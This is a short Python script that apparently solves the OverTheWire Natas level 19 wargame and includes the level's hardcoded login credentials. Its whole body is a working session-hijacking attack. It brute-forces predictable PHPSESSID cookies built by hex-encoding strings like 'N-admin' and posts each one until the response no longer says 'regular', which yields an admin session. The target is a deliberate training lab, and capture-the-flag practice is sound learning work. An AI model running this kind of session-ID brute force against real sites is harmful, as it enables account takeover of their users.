import requests
import time
import binascii


session = requests.Session()
session.auth = ("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")

occur = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

password = ""

for i in range(641):
    print((binascii.hexlify((str(i)+"-admin").encode())).decode())
    cookies = dict(PHPSESSID=(binascii.hexlify((str(i)+"-admin").encode())).decode())
    auth = session.post('http://natas19.natas.labs.overthewire.org/index.php', cookies=cookies)

    print(str(i), auth.text)

    if "regular" not in auth.text:
        print("exists", str(i))
        break



